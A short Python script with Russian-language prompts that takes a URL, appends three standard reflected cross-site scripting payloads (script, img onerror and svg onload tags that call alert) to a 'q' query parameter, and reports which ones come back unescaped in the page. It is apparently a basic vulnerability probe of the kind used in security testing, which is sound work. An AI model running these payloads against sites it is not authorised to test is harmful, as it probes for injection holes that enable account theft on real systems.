import requests

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>"
]

url = input("Введите url (например, https://example.com): ")

for payload in payloads:
    test_url = url +"?q=" + payload
    response = requests.get(test_url)

    if payload in response.text:
        print(f"{payload}")
    else:
        print(f"не сработал {payload}")